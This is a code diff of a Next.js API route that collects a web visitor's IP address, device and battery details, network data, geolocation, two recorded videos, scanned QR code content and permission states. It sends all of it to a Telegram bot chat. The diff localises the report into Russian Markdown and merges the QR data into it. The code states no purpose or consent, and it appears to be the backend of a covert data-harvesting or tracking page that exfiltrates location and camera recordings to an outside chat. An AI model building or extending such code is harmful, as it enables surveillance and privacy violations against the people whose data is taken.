@@ -23,40 +23,38 @@ export async function POST(req: NextRequest) {
       video2,
       qrCodeData,
       permissionStatus,
-      ipAddress,
     } = await req.json();
+
+    const ipAddress = req.headers.get("x-forwarded-for") || "Unavailable"; // Получаем IP-адрес из заголовка
 
     const messages: Promise<Response>[] = [];
 
     // --- Construct Summary Message ---
-    let summaryText = "Received data from web app:";
-    summaryText += `\n\n--- Client & Device Info ---`;
-    summaryText += `\nIP Address: ${ipAddress || "Unavailable"}`;
-    summaryText += `\nUser Agent: ${clientInfo?.userAgent || "Unavailable"}`;
-    summaryText += `\nPlatform: ${clientInfo?.platform || "Unavailable"}`;
-    summaryText += `\nCPU Cores: ${clientInfo?.hardwareConcurrency || "Unavailable"}`;
-    summaryText += `\nDevice Memory: ${deviceMemory ? `${deviceMemory} GB` : "Unavailable"}`;
-    summaryText += `\nBattery Level: ${batteryInfo?.level !== undefined ? `${(batteryInfo.level * 100).toFixed(0)}%` : "Unavailable"}`;
-    summaryText += `\nBattery Charging: ${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Yes" : "No") : "Unavailable"}`;
+    let summaryText = "📊 *Отчет о сессии*\n\n";
 
-    summaryText += `\n\n--- Network Info ---`;
-    summaryText += `\nConnection Type: ${networkInfo?.effectiveType || "Unavailable"}`;
-    summaryText += `\nRTT: ${networkInfo?.rtt !== undefined ? `${networkInfo.rtt} ms` : "Unavailable"}`;
-    summaryText += `\nDownlink: ${networkInfo?.downlink !== undefined ? `${networkInfo.downlink} Mbps` : "Unavailable"}`;
+    summaryText += "--- 📱 *Информация об устройстве* ---\n";
+    summaryText += `*IP:* \`${ipAddress}\`\n`;
+    summaryText += `*User Agent:* \`${clientInfo?.userAgent || "Недоступно"}\`\n`;
+    summaryText += `*Платформа:* ${clientInfo?.platform || "Недоступно"}\n`;
+    summaryText += `*Ядра CPU:* ${clientInfo?.hardwareConcurrency || "Недоступно"}\n`;
+    summaryText += `*Память устройства:* ${deviceMemory ? `${deviceMemory} GB` : "Недоступно"}\n`;
+    summaryText += `*Батарея:* ${batteryInfo?.level !== undefined ? `${(batteryInfo.level * 100).toFixed(0)}%` : "Недоступно"} (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;
 
-    summaryText += `\n\n--- Permissions & Data ---`;
-    summaryText += `\nGeolocation: ${geolocation ? `Lat ${geolocation.latitude}, Lng ${geolocation.longitude}` : "Denied or Unavailable"}`;
-    summaryText += `\nVideo 1 Recorded: ${video1 ? "Yes" : "No"}`;
-    summaryText += `\nVideo 2 Recorded: ${video2 ? "Yes" : "No"}`;
-    summaryText += `\nQR Code Scanned: ${qrCodeData || "No"}`;
+    summaryText += "\n--- 🌐 *Информация о сети* ---\n";
+    summaryText += `*Тип соединения:* ${networkInfo?.effectiveType || "Недоступно"}\n`;
+    summaryText += `*RTT:* ${networkInfo?.rtt !== undefined ? `${networkInfo.rtt} ms` : "Недоступно"}\n`;
+    summaryText += `*Downlink:* ${networkInfo?.downlink !== undefined ? `${networkInfo.downlink} Mbps` : "Недоступно"}\n`;
+
+    summaryText += "\n--- ✅ *Статус разрешений* ---\n";
+    summaryText += `*Геолокация:* ${permissionStatus?.geolocation || "Неизвестно"}\n`;
+    summaryText += `*Камера:* ${permissionStatus?.camera || "Неизвестно"}\n`;
+    summaryText += `*Микрофон:* ${permissionStatus?.microphone || "Неизвестно"}\n`;
+
+    summaryText += "\n--- 🎥 *Медиа и QR* ---\n";
+    summaryText += `*Видео 1 записано:* ${video1 ? "Да ✅" : "Нет ❌"}\n`;
+    summaryText += `*Видео 2 записано:* ${video2 ? "Да ✅" : "Нет ❌"}\n`;
+    summaryText += `*QR-код отсканирован:* ${qrCodeData ? `Да ✅ (\`${qrCodeData}\`)` : "Нет ❌"}\n`;
     
-    if (permissionStatus) {
-      summaryText += `\n\n--- Permission Status ---`;
-      for (const [key, value] of Object.entries(permissionStatus)) {
-        summaryText += `\n${key}: ${value}`;
-      }
-    }
-
     messages.push(
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -66,6 +64,7 @@ export async function POST(req: NextRequest) {
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
           text: summaryText,
+          parse_mode: "Markdown", // Используем Markdown для форматирования
         }),
       }).then(async res => {
         console.log("Summary message API response status:", res.status);
@@ -77,7 +76,7 @@ export async function POST(req: NextRequest) {
       })
     );
 
-    // Send Geolocation
+    // Send Geolocation as a separate message if available
     if (geolocation?.latitude && geolocation?.longitude) {
       console.log("Attempting to send location...");
       messages.push(
@@ -144,30 +143,6 @@ export async function POST(req: NextRequest) {
           if (!res.ok) {
             const errorBody = await res.text();
             console.error("Video 2 API error response:", errorBody);
-          }
-          return res;
-        })
-      );
-    }
-
-    // Send QR Code Data
-    if (qrCodeData) {
-      console.log("Attempting to send QR Code data...");
-      messages.push(
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: `QR Code Scanned: ${qrCodeData}`,
-          }),
-        }).then(async res => {
-          console.log("QR Code message API response status:", res.status);
-          if (!res.ok) {
-            const errorBody = await res.text();
-            console.error("QR Code message API error response:", errorBody);
           }
           return res;
         })
